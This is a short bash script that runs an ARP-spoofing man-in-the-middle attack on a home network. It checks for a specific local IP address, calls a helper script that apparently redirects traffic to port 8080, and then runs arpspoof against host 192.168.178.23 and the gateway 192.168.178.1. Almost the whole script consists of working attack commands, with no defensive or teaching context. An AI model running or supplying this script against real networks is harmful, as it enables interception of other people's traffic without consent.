#!/bin/bash

if [[ -z $(ifconfig | grep 'inet 192.168.178.33') ]]; then
    echo "[-] Error: cant find wifi"
    exit 1
fi
./forward_to_8080.sh 
echo "alles ok"
arpspoof -i wlan0 -t 192.168.178.23 -r 192.168.178.1